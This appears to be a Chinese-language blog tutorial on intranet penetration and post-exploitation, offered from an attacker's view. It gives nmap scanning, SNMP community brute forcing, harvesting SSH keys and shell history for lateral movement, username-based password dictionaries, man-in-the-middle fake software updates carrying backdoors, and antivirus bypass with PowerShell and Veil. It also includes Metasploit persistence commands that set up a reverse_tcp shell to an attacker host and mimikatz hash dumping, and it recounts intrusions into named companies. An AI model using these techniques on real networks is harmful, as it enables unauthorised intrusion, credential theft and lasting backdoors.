## Misc-center

1. nmap -sP 172.19.16.1/24   发现扫描主机.

2. 查看 host 获取局域网信息.

3. 直接攻击网段路由或交换机，简单绘制内网的结构
（我在从TCL某漏洞看内网渗透教学分享之内网信息探测和后渗透准备中就是获取了cisco路由的privilege15权限，得到了内网结构，进一步进行跨vlan攻击）


4. 多尝试交换机snmp弱口令，一旦成功，内网结构清晰


	•	关于snmp渗透  
	什么是snmp  
	使用了snmp管理的设备，只需要community string即可，所以针对这个string爆破或者社工都是可行的，默认public/private  
	首先进行161端口扫描，发现snmp开放情况，通过弱口令查看设备信息，在oid中读取设备密码  
	￼
	•	  
	例子：中国移动集团华为三层交换SNMP漏洞，可获取管理帐号密码，已成功登录  
	可以通过这个nmap和msf脚本进行自动攻击h3c-pt-tools
	•	尝试从主机的用户目录或者管理运维邮箱寻找敏感信息(某次渗透即是keylogger运维后在测试机桌面获取到拓扑和网段)  
	￼
	•	
	•	通过resolv.conf找到内网dns服务器，或者字典穷举dns
	•	注意分析用户的.bash_history，一般可以分析出用户的使用习惯，纪录等,获取/.shh/，尝试配合history的连接纪录直接通过密钥登陆其他机器
0x03 内网渗透的常见攻击技巧

•	通过之前的信息收集和探测，判断出主要的业务机器，如OA，dbserver，利用ssh信任，连入机器后导出员工的userlist，做成针对性的字典，大部分内网的安全性都是脆弱的，且最容易出问题的就是口令安全（大公司也不例外）  
%username%1  
%username%12  
%username%123  
%username%1234  
%username%12345  
%username%123456

主要对ssh,dbserver,vnc,ftp进行爆破
￼
•	对开了web service的server进行常规渗透，有可以减少工作量的办法就是先对机器批量识别banner，通过banner判断出cms或中间件，直接利用exp
•	中间人攻击
常用ettercap，不建议做arp的mitm，可以尝试dhcp mitm或者icmp mitm
也可以猥琐一点，劫持插件，攻击网关，或者利用evilgrade去伪造软件更新(如notepad++)，然后捆绑上后门，直接打下工作机器，进入办公网
￼
￼
简单配置后用msf生成后门，start即可配合ettercap使用伪造软件更新了
￼
•	常见服务漏洞攻击  
smb/ms08067/ipc$/NetBIOS…………
但是在针对这些比较古老的漏洞攻击时，很可能有AV拦截，所以在不同场景遇到的坑都不一样
比如之前在西电DM牛告诉我，有AV，如果直接利用psexec返回会话，即会拦截，这时就可以利用powershell来bypass AVPowershell tricks::Bypass AV
0x04 后渗透准备和扩大战果

一次完美的内网渗透肯定不是能够一次性完成的，因为整个过程需要管理员的"配合"（口胡。。。）所以后渗透准备时很有必要的
1. 后门准备

msf的后门已经不错，只需要稍加改造就能很好满足我们的需求
普通msfpayload生成的后门不是持续性的，不利于我们下次继续工作，所以需要一个持续性后门
msf的持续性后门有两种，通过服务启动(metsvc)和通过启动项启动(persistence)
通过服务的后门有个弊端，服务名称是meterpreter，利用方式是： 上传后门，通过metsvc安装服务
1
2
3
4
5
meterpreter \> run metsvc
...(设定端口，并且上传后门文件)
use exploit/multi/handler
set PAYLOAD windows/metsvc_bind_tcp
exploit
通过启动项的利用方式：
1
2
3
4
5
meterpreter \> run persistence -X -i 10 -p port -r hostip
 
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
当然，直接生成的后门有可能会被杀，所以这里我推荐一个很不错的工具，veil，之前再一次小型apt中用这个生成了的后门直接bypass了360
linux下有两个常用的后门
mafix rookit和Cymothoa，后者听说可以克隆root用户，不过大部分的backdoor基本都相当于一个加密nc，会新开端口，所以如果webshell存活，可以直接考虑用webshell维持权限





3. hash

mimikatz，不用多说，利用meterpreter可以直接load模块
Quarks PwDump
wce
0x05 something else

内网渗透涉及的面很广，本文主要说到的是一些很简单的问题和常规的思路
尚未谈到的 域渗透 打印机 办公网嗅探 入侵日志清理等等
如果有机会，日后慢慢补全



